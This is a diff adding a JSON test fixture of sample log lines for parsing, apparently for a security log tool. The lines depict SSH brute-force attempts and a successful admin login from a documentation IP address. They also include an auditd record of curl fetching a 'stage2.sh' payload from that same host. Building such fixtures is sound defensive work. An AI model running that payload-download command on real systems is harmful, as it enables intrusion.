@@ -1,0 +1,43 @@
+[
+  {
+    "raw_line": "Nov  1 10:00:01 core-auth-srv01 sshd[12450]: Failed password for invalid user admin from 198.51.100.24 port 54321 ssh2",
+    "format": "syslog_sshd",
+    "description": "SSH failed password for invalid user"
+  },
+  {
+    "raw_line": "Nov  1 10:00:05 core-auth-srv01 sshd[12452]: Failed password for admin from 198.51.100.24 port 54322 ssh2",
+    "format": "syslog_sshd",
+    "description": "SSH failed password for existing user"
+  },
+  {
+    "raw_line": "Nov  1 10:02:15 core-auth-srv01 sshd[12460]: Accepted password for admin from 198.51.100.24 port 54330 ssh2",
+    "format": "syslog_sshd",
+    "description": "SSH accepted password"
+  },
+  {
+    "raw_line": "Nov  1 10:02:16 core-auth-srv01 sshd[12460]: pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)",
+    "format": "syslog_pam",
+    "description": "PAM session opened"
+  },
+  {
+    "raw_line": "type=SYSCALL msg=audit(1762002180.123:4501): arch=c000003e syscall=59 success=yes exit=0 a0=55a1b2 a1=55a1c8 a2=55a1d8 a3=7ffd items=2 ppid=12460 pid=12470 auid=1000 uid=1000 gid=1000 euid=1000 comm=\"curl\" exe=\"/usr/bin/curl\" key=\"process_exec\"",
+    "format": "auditd_syscall",
+    "description": "Auditd execve syscall execution"
+  },
+  {
+    "raw_line": "type=EXECVE msg=audit(1762002180.123:4501): argc=3 a0=\"curl\" a1=\"-s\" a2=\"http://198.51.100.24/stage2.sh\"",
+    "format": "auditd_execve",
+    "description": "Auditd execve command line arguments"
+  },
+  {
+    "raw_line": "ESTAB 0 0 10.0.0.15:22 198.51.100.24:54330",
+    "format": "ss_netstat",
+    "description": "ss/netstat active TCP connection snapshot"
+  },
+  {
+    "raw_line": "Corrupted non-syslog garbage text with no structure @@@@@",
+    "format": "malformed",
+    "description": "Malformed unparseable text line"
+  }
+]
+
